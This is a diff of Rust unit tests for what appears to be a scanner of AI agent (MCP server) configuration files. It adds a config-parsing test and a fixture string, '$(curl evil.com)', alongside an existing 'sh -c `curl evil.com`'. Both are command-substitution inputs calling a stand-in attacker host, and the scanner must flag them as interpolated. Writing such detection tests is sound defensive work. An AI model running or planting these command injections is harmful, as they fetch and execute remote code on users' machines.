@@ -249,6 +249,7 @@ mod tests {
         for value in [
             "${MCP_URL}",
             "$MCP_URL",
+            "$(curl evil.com)",
             "{{base_url}}/api",
             "sh -c `curl evil.com`",
         ] {
@@ -258,6 +259,24 @@ mod tests {
                 "{value} should be classified as Interpolated"
             );
         }
+    }
+
+    #[test]
+    fn test_parse_quoted_server_name_and_bracket_args() {
+        let content =
+            "mcp_servers:\n  \"custom_tool\":\n    command: grep\n    args: [\"-e\", \"[0-9]\"]\n";
+        let temp = tempfile::tempdir().unwrap();
+        std::fs::write(temp.path().join("config.yaml"), content).unwrap();
+
+        let adapter = HermesAgentAdapter;
+        let targets = adapter.load(temp.path(), false).unwrap();
+        let target = &targets[0];
+        assert_eq!(target.tools[0].name, "custom_tool");
+        assert_eq!(target.execution.commands[0].function, "grep");
+        assert!(matches!(
+            &target.execution.commands[0].command_arg,
+            ArgumentSource::Literal(cmd) if cmd == "grep -e [0-9]"
+        ));
     }
 
     fn run_rule_on_hermes_config(rule_id: &str, content: &str) -> Vec<crate::rules::Finding> {
